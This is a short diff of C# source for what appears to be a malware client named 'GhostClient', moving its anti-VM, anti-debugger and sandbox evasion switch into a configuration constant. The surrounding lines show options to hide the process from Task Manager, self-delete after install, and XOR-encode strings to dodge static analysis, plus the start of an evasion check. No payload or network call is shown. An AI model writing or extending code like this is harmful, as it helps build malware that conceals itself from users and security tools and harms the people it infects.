@@ -36,7 +36,8 @@ namespace GhostClient
         private static bool STEALTH = true;          // Hide from Task Manager
         private static bool MELT = false;            // Self-delete after install
         private static bool SINGLE_INSTANCE = false;  // Only one instance allowed
-        private static bool OBFUSCATE = true;        // XOR string obfuscation
+        private static bool ANTI_ANALYSIS = true;     // Anti-VM/Debug/Sandbox evasion
+        private static bool OBFUSCATE = true;          // XOR string obfuscation
 
         // XOR encoded strings (decoded at runtime to avoid static analysis)
         static string Decode(byte[] data, int key) { var s = new char[data.Length]; for (int i = 0; i < data.Length; i++) s[i] = (char)(data[i] ^ ((key + i * 7) % 256)); return new string(s); }
@@ -53,7 +54,6 @@ namespace GhostClient
         private static string _publicIp = "";
         private static string _localIp = "";
         private static string _hardwareId = "";
-        private static bool _antiAnalysis = true;
 
         // ── ANTI-ANALYSIS ──
         static bool IsSandboxOrVM()
@@ -578,7 +578,7 @@ namespace GhostClient
             if (junk.Length > 0) { int _ = junk.GetHashCode(); }
 
             // ── ANTI-ANALYSIS: Check for VM/Sandbox/Debugger ──
-            if (_antiAnalysis)
+            if (ANTI_ANALYSIS)
             {
                 if (IsSandboxOrVM())
                 {
